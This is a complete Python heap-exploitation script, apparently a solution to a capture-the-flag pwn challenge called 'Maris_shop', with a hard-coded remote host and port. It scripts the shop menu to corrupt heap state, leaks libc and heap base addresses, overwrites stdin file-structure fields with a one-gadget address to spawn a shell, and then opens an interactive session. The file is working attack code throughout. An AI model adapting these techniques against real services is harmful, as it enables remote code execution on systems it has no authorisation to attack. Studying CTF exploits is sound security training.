#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import re

bin_file = './Maris_shop'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'110.10.147.102', 'port':7767})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn):
    shop = Shop(conn)

    for _ in range(16):
        shop.add(1, 0)
    while len(shop.show_all()) < 16:
        shop.add(1, 0)
    shop.buy_all(True)

    shop.add(1, 0)
    for _ in range(13):
        shop.add(1, 0)
        shop.remove(0)

    while len(shop.show_all()) < 4+1:
        shop.add(1, 0)

    shop.buy(2)
    addr_libc_mainarena = int(shop.show(15)['Amount']) - 0x58
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    addr_libc_stdin         = libc.symbols['_IO_2_1_stdin_']
    addr_libc_stdlock       = addr_libc_stdin + 0x1eb0
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    shop.buy(0)
    item = shop.show(15)
    addr_heap_base      = int(item['Amount']) - 0x1ae0
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    shop.add_name(item['Name'], (addr_libc_stdin+0x40-0x10) - int(item['Amount']))

    exploit  = 'X'*5
    exploit += p64(addr_libc_stdlock)
    exploit += '\x00'*0x48
    exploit += p64(addr_libc_stdin + 0xe0 - 0x28)
    exploit += p64(libc.address + 0xf02a4)
    conn.sendlineafter('choice:', '1')
    conn.sendlineafter('item?:', '1')
    conn.sendlineafter('Amount?:', exploit)
    
class Shop:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def add(self, item, amount):
        self.sendlineafter('choice:', '1')
        self.sendlineafter('item?:', str(item))
        if 'Full' in self.recv(4):
            return False
        self.sendlineafter(':', str(amount))
        return True

    def add_price(self, price, amount):
        while True:
            self.sendlineafter('choice:', '1')
            self.recvuntil('\n')

            for i in range(1, 7):
                if int(self.recvuntil('\n').split('---- ')[1]) != price:
                    continue
                self.sendlineafter('item?:', str(i))
                self.sendlineafter(':', str(amount))
                return
            self.sendlineafter('item?:', '0')

    def add_name(self, name, amount):
        while True:
            self.sendlineafter('choice:', '1')
            self.recvuntil('\n')

            for i in range(1, 7):
                if ' '.join(self.recvuntil('\n').split()[1:-2]) != name:
                    continue
                self.sendlineafter('item?:', str(i))
                self.sendlineafter(':', str(amount))
                return
            self.sendlineafter('item?:', '0')

    def remove(self, item):
        self.sendlineafter('choice:', '2')
        self.sendlineafter('item?:', str(item))

    def show(self, item):
        self.sendlineafter('choice:', '3')
        self.sendlineafter('choice:', '1')
        self.sendlineafter('item?:', str(item))
        return dict(re.findall(r'(.*): (.*)', self.recvuntil('\n\n')))

    def show_all(self):
        self.sendlineafter('choice:', '3')
        self.sendlineafter('choice:', '2')
        return self.recvuntil('\n\n', drop=True).split('\n')[1:]

    def buy(self, item):
        self.sendlineafter('choice:', '4')
        self.sendlineafter('choice:', '1')
        self.sendlineafter('item?:', str(item))

    def buy_all(self, clear):
        self.sendlineafter('choice:', '4')
        self.sendlineafter('choice:', '2')
        self.sendlineafter('choice:', '1' if clear else '2')

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
